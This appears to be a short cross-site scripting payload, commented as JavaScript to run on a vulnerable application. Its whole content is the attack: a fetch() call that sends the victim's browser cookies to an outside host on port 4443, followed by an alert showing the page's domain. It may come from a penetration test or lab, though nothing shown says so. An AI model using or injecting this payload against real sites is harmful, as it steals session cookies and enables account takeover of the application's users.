// javascript to be executed on vulnerable application
fetch('https://scampbell:4443/cookie?' + document.cookie.split('; ').join('&'));
alert(document.domain);
